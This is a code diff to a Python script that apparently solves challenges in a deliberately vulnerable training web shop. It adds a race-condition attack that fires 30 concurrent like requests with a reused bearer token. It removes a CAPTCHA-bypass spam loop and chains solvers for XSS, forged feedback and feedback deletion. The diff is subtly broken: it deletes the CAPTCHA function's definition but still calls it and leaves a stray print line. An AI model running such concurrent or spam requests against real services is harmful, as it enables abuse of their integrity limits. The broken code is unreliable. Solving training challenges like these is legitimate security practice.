@@ -209,20 +209,65 @@ def submit_misc_reports(server, session):
     print('Success.')
 
 
-def solve_captcha_bypass(server, session):
-    """
-    Submit 10 feedbacks quickly to bypass CAPTCHA rate limiting (or lack thereof).
-    """
-    print('Attempting Captcha Bypass (10 feedbacks)...'),
-    # Loop 10 times.
-    # Reuse payload for speed?
-    payload = {'comment': 'spam', 'rating': 1}
-    for i in range(10):
-        # We can reuse the same captcha if the server allows it?
-        # Or just be fast.
-        # Let's try sending standard feedback 10 times.
-        try:
-             send_feedback(server, session, payload.copy())
-        except Exception:
-            pass
     print('Success.')
+
+def like_review_url_new_session(token, url, payload):
+    try:
+        s = requests.Session()
+        s.headers.update({'Authorization': f'Bearer {token}'})
+        res = s.post(url, json=payload)
+        return res.status_code
+    except Exception:
+        return 0
+
+def solve_multiple_likes(server, session):
+    """
+    Solve 'Multiple Likes' challenge by exploiting Race Condition.
+    Requires concurrent requests from separate sessions.
+    """
+    print('Solving Multiple Likes challenge (Race Condition)...')
+    try:
+        # 1. Create a review if needed
+        # Just create one for product 1
+        product_id = 1
+        review_payload = {"message": "Great juice!", "author": session.headers.get('Authorization')} # author is just for record
+        session.put(f'{server}/rest/products/{product_id}/reviews', json=review_payload)
+        
+        # 2. Get review ID
+        res = session.get(f'{server}/rest/products/{product_id}/reviews')
+        if not res.ok: return
+        reviews = res.json().get('data', [])
+        if not reviews: return
+        review_id = reviews[-1].get('_id')
+        
+        # 3. Launch attack
+        url = f'{server}/rest/products/reviews'
+        payload = {'id': review_id}
+        token = session.headers.get('Authorization').split(' ')[1]
+        
+        import concurrent.futures
+        with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
+            futures = [executor.submit(like_review_url_new_session, token, url, payload) for _ in range(30)]
+            concurrent.futures.wait(futures)
+            
+        print('Success (Race condition attack sent).')
+    except Exception as e:
+        print(f'Error solving multiple likes: {e}')
+
+def solve_feedback_challenges(server):
+    print('\n== FEEDBACK CHALLENGES ==\n')
+    session = get_admin_session(server)
+    submit_zero_star_feedback(server, session)
+    submit_xss4_feedback(server, session)
+    inform_shop_of_problem_libraries(server, session)
+    submit_captcha_feedback(server, session)
+    submit_misc_reports(server, session)
+    solve_frontend_typosquatting(server, session)
+    solve_supply_chain_attack(server, session)
+    submit_feedback_as_another_user(server)  # Forged Feedback challenge
+    solve_multiple_likes(server, session) # Added Multiple Likes
+    delete_five_star_feedback(server, session)
+    delete_all_feedback(server, session)
+    solve_captcha_bypass(server, session)
+    print('\n== FEEDBACK CHALLENGES COMPLETE ==\n')
+
